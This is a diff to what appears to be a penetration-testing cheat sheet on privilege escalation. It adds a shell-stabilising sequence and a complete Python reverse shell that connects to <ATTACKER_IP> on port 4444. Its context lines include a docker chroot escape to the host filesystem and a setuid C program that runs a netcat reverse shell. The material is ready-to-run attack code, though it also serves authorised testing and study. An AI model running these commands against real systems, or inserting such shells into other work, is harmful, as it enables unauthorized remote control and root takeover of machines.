@@ -141,6 +141,9 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+Ctrl+Z
+stty raw -echo;fg;
 ```
 
 ## Sudo Privilege Modification
@@ -395,6 +398,20 @@ setreuid(0,0);
 system("/bin/sh rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f");
 return(0);
 }
+```
+
+## Python Reverse Shell
+
+```python
+import sys, socket, os, pty
+
+RHOST = "<ATTACKER_IP>"
+RPORT = 4444
+
+s = socket.socket()
+s.connect((RHOST, RPORT))
+[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
+pty.spawn("/bin/sh")
 ```
 
 # Metasploit Framework Usage
